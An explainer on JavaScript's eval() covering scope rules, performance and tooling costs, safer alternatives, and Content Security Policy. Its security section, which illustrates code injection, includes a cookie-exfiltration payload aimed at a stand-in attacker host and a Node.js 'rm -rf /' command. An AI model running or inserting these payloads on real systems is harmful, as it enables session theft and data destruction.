# Eval

The **`eval()`** function in JavaScript evaluates a string of text as source code and executes it within the current runtime environment.

While it is one of the oldest features in JavaScript, modern development guidelines treat it with the rule: **"eval is evil"**—almost every valid use case has a safer, faster, and cleaner alternative.

---

### 1. How `eval()` Works

When passed a string, `eval()` parses the contents, compiles them on the fly, and runs them synchronously.

```javascript
const x = 10;
const y = 20;

const result = eval("x + y");
console.log(result); // 30

eval("function greet() { return 'Hello!'; }");
console.log(greet()); // "Hello!"

```

If the argument passed to `eval()` is not a string, `eval()` returns the argument untouched:

```javascript
eval(123); // 123
eval([1, 2]); // [1, 2]

```

---

### 2. Direct vs. Indirect `eval` (Scope Mechanics)

How you invoke `eval` dramatically changes what scope it can access.

#### Direct `eval` (Local Scope)

A direct call to `eval(...)` executes code inside the **current local lexical scope**. It can read and modify outer local variables:

```javascript
function calculate() {
  let secret = 42;
  eval("secret = 99"); // Modifies local 'secret'
  console.log(secret); // 99
}

calculate();

```

> **Strict Mode Note:** In `'use strict'`, direct `eval` can read local variables, but any variables or functions declared *inside* the eval string cannot escape into the surrounding scope:
> ```javascript
> "use strict";
> eval("let temp = 5;");
> console.log(temp); // ReferenceError: temp is not defined
> 
> ```
> 
> 

#### Indirect `eval` (Global Scope)

If you call `eval` indirectly (by referencing it through another variable, aliasing it, or using the comma operator `(0, eval)(...)`), it runs strictly in the **global scope**:

```javascript
const x = "global";

function test() {
  const x = "local";
  const customEval = eval;
  
  console.log(eval("x"));         // "local"  (direct call)
  console.log(customEval("x"));   // "global" (indirect call)
  console.log((0, eval)("x"));    // "global" (indirect call)
}

test();

```

---

### 3. The Three Major Dangers of `eval()`

#### A. Security (Code Injection / XSS)

If any portion of user input reaches `eval()`, an attacker can run arbitrary JavaScript with the permissions of the current session:

```javascript
// A naive calculator endpoint:
function computeMath(userInput) {
  return eval(userInput); 
}

// Attacker enters:
computeMath("document.location='http://attacker.com/steal?cookie=' + document.cookie");
// Or in Node.js:
computeMath("require('child_process').execSync('rm -rf /')");

```

#### B. Performance Degradation (Inline Caches Disabled)

Modern JavaScript engines (like V8) use optimizing JIT (Just-In-Time) compilers. They optimize code by predicting the memory layout and variable scopes of functions ahead of time.

Because a direct `eval()` can introduce or change variables unpredictably at runtime, the engine **disables optimizations** (such as inline caching and register allocation) for the entire enclosing scope. Code containing `eval()` runs significantly slower.

#### C. Tooling & Minification Failures

Minifiers (such as Terser, esbuild, or UglifyJS) shorten variable names (`userName` becomes `a`). If code inside an `eval` string references `userName`, minification breaks the application because the minifier cannot safely rename variables in surrounding code.

---

### 4. Safer Alternatives to Common `eval()` Anti-Patterns

| Anti-Pattern using `eval()` | Safe Alternative | Why the alternative is better |
| --- | --- | --- |
| **Parsing JSON:**<br>

<br>`eval("(" + jsonString + ")")` | `JSON.parse(jsonString)` | Fast, native C++ parsing; cannot execute malicious code. |
| **Accessing Dynamic Keys:**<br>

<br>`eval("user." + fieldName)` | `user[fieldName]` | Standard bracket notation is secure and fast. |
| **Dynamic Code Execution:**<br>

<br>`eval("a + b")` | `new Function('a', 'b', 'return a + b')` | Does not access local scope (runs only in global scope). |
| **Mathematical Parsing:**<br>

<br>`eval("4 * (2 + 3)")` | Dedicated math parser (e.g., `mathjs`, AST parser) | Eliminates arbitrary execution risks. |

---

### 5. `eval()` vs. `new Function()`

When dynamic execution cannot be avoided (e.g., template engines or developer playgrounds), `new Function()` is preferred over `eval()`:

```javascript
// new Function([arg1, arg2, ...], functionBody)
const adder = new Function('a', 'b', 'return a + b');
console.log(adder(5, 10)); // 15

```

#### Key differences:

* `new Function()` **never** has access to local closures; it only accesses the global scope.
* It doesn't disrupt minification of outer variables.
* It is easier for engines to optimize than arbitrary direct `eval()`.

---

### 6. Strict Content Security Policy (CSP)

In modern web applications, production environments typically enforce a Content Security Policy via HTTP headers:

```http
Content-Security-Policy: default-src 'self';

```

Under this standard policy, **the browser completely blocks `eval()` and `new Function()**`, throwing:

```
EvalError: Refused to evaluate a string as JavaScript because 'unsafe-eval' is not an allowed source of script.

```

To run `eval()`, you would have to explicitly add `'unsafe-eval'` to your CSP header, which introduces vulnerabilities across your entire domain.